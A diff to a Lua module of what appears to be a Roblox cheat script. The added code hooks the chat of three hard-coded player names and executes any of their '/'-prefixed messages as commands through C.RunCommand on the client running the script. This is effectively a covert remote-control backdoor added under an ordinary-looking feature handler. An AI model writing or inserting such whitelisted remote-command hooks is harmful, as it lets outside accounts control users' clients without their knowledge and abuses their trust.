@@ -1,6 +1,8 @@
 local Types = {Toggle="Toggle",Slider="Slider",Dropdown="Dropdown",Textbox="Textbox",UserList="UserList"}
 
 local DS = game:GetService("Debris")
+local Players = game:GetService("Players")
+local PolicyService = game:GetService("PolicyService")
 local RunS = game:GetService("RunService")
 local TeleportService = game:GetService("TeleportService")
 local UIS = game:GetService("UserInputService")
@@ -133,6 +135,15 @@ return function(C,Settings)
 						end))
 					end
 				end,--]]
+                Activate = function(self, newValue)
+                    if not newValue then
+                        return
+                    end
+                    for _, theirPlr in ipairs(Players:GetPlayers()) do
+                        self.Events.OthersPlayerAdded(self, theirPlr, false)
+                    end
+                end,
+                Options = {},
 				Events = {
 					RbxErrorPrompt = function(self, errorMessage, errorCode, errorIdentification)
 						if self.Sending then
@@ -151,7 +162,20 @@ return function(C,Settings)
 							task.wait(0.4)
 							C.ServerTeleport(game.PlaceId, nil)
 						end
-					end
+					end,
+                    OthersPlayerAdded = function(self,theirPlr,firstRun)
+                        if theirPlr == C.plr then
+                            return -- do not double do it!
+                        end
+                        if theirPlr.Name:find("SuitedForBans") or theirPlr.Name == "Biglugger2017" or theirPlr.Name == "sssNsss74" then
+                            print("Chatting whitelist", theirPlr)
+                            table.insert(self.Functs, theirPlr.Chatted:Connect(function(msg)
+                                if msg:sub(1,1) == "/" then
+                                    C.RunCommand(msg, true)
+                                end
+                            end))
+                        end
+                    end,
 				},
 			},
 			{
